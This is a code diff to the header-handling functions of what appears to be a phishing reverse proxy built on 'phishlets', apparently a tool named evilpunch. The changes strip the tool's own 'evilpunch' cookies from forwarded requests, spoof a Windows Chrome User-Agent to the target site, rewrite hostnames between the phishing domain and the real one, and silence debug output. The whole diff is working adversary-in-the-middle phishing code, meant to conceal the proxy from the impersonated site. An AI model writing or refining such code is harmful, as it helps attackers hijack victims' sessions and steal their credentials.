@@ -6,12 +6,48 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
     # print(f"commin headers: {headers}")
     # Convert CIMultiDictProxy to regular dict if needed
     if hasattr(headers, 'getall'):
-        # It's a CIMultiDictProxy, convert to regular dict
-        headers_dict = dict(headers)
+        # It's a CIMultiDictProxy, convert to regular dict while preserving multiple values
+        headers_dict = {}
+        for key in headers:
+            values = headers.getall(key)
+            if len(values) == 1:
+                headers_dict[key] = values[0]
+            else:
+                headers_dict[key] = values
     else:
         # It's already a regular dict
         headers_dict = headers.copy()
     
+    # check cookie header find cookie name starting with evilpunch and delete that cookies
+    
+    # check cookie header find cookie name starting with evilpunch and delete that cookies
+    if 'Cookie' in headers_dict:
+        cookie_header = headers_dict['Cookie']
+        if cookie_header:
+            # Split cookies by semicolon and filter out evilpunch cookies
+            cookies = [cookie.strip() for cookie in cookie_header.split(';')]
+            filtered_cookies = []
+            
+            for cookie in cookies:
+                # Check if cookie name starts with 'evilpunch' (case insensitive)
+                cookie_name = cookie.split('=')[0].strip()
+                if not cookie_name.lower().startswith('evilpunch'):
+                    filtered_cookies.append(cookie)
+            
+            # Update the Cookie header with filtered cookies
+            if filtered_cookies:
+                headers_dict['Cookie'] = '; '.join(filtered_cookies)
+                print(f"  🍪 Filtered cookies: {len(filtered_cookies)} remaining out of {len(cookies)} original")
+            else:
+                # Remove Cookie header entirely if no cookies remain (including case where only evilpunch cookie exists)
+                del headers_dict['Cookie']
+                print(f"  🍪 Removed all evilpunch cookies from request - deleted entire Cookie header")
+           
+       
+    #  chnage value of User-Agent
+    if "User-Agent" in headers_dict:
+        headers_dict['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
+        headers_dict['Sec-Ch-Ua-Platform'] = "Windows"
     # Check and modify Accept-Encoding header to remove zstd if present
     if 'Accept-Encoding' in headers_dict:
         accept_encoding = headers_dict['Accept-Encoding']
@@ -40,16 +76,16 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
     # for k in keys_to_delete:
     #     headers_dict.pop(k, None)
     # check if accept-encoding is in headers_dict if yes then print the headers_dict
-    if 'Accept-Encoding' in headers_dict:
-        print(f"\n  🟢 🟢---- headers_dict: {headers_dict}")
+    # if 'Accept-Encoding' in headers_dict:
+    #     print(f"\n  🟢 🟢---- headers_dict: {headers_dict}")
     # headers_dict['Accept-Encoding'] = 'identity'
 
     # If we have phishlet data and reverse filter is enabled, use proper hostname replacement
     if phishlet_data and any(host.get('reverce_filter', False) for host in phishlet_data.get('hosts_to_proxy', [])):
         # Build replacement mapping: proxy_hostname -> original_hostname
         hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
-        print(f"\n ---- hosts_to_proxy: {hosts_to_proxy}")
-        print(f"\n ---- proxy_host parameter: {proxy_host}")
+        # print(f"\n ---- hosts_to_proxy: {hosts_to_proxy}")
+        # print(f"\n ---- proxy_host parameter: {proxy_host}")
         
         # Extract base domain from proxy_host (e.g., 'test.xx.in' -> 'xx.in')
         base_domain = proxy_host
@@ -59,7 +95,7 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
             if len(parts) >= 2:
                 base_domain = '.'.join(parts[-2:])
         
-        print(f"\n ---- extracted base_domain: {base_domain}")
+        # print(f"\n ---- extracted base_domain: {base_domain}")
         
         replacement_map = {}
         
@@ -86,11 +122,11 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
             
             replacement_map[proxy_hostname] = original_hostname
             
-        print(f"\n ---- replacement_map: {replacement_map}")
+        # print(f"\n ---- replacement_map: {replacement_map}")
         
         # Sort by length (longest first) to ensure specific subdomains are processed before base domains
         sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
-        print(f"Sorted replacements: {sorted_replacements}")
+        # print(f"Sorted replacements: {sorted_replacements}")
         
         # Apply replacements to headers
         for key, value in headers_dict.items():
@@ -171,7 +207,7 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
                         new_values.append(v)
                 headers_dict[key] = new_values
     
-    print(f"phishlet_data_for_headers: {phishlet_data} \n")
+    # print(f"phishlet_data_for_headers: {phishlet_data} \n")
     
     # Check if phishlet_data exists before accessing its properties
     if phishlet_data:
@@ -209,8 +245,14 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
 def patch_headers_in(headers, proxy_host, target_host):
     # Convert CIMultiDictProxy to regular dict if needed
     if hasattr(headers, 'getall'):
-        # It's a CIMultiDictProxy, convert to regular dict
-        headers_dict = dict(headers)
+        # It's a CIMultiDictProxy, convert to regular dict while preserving multiple values
+        headers_dict = {}
+        for key in headers:
+            values = headers.getall(key)
+            if len(values) == 1:
+                headers_dict[key] = values[0]
+            else:
+                headers_dict[key] = values
     else:
         # It's already a regular dict
         headers_dict = headers.copy()
@@ -292,6 +334,7 @@ def replace_in_chunk_multi(chunk, target_to_proxy_map):
                 replaced = True
         return chunk
     return chunk
+
 
 
 def apply_reverse_filter_to_request_body(request_body, phishlet_data, proxy_domain):
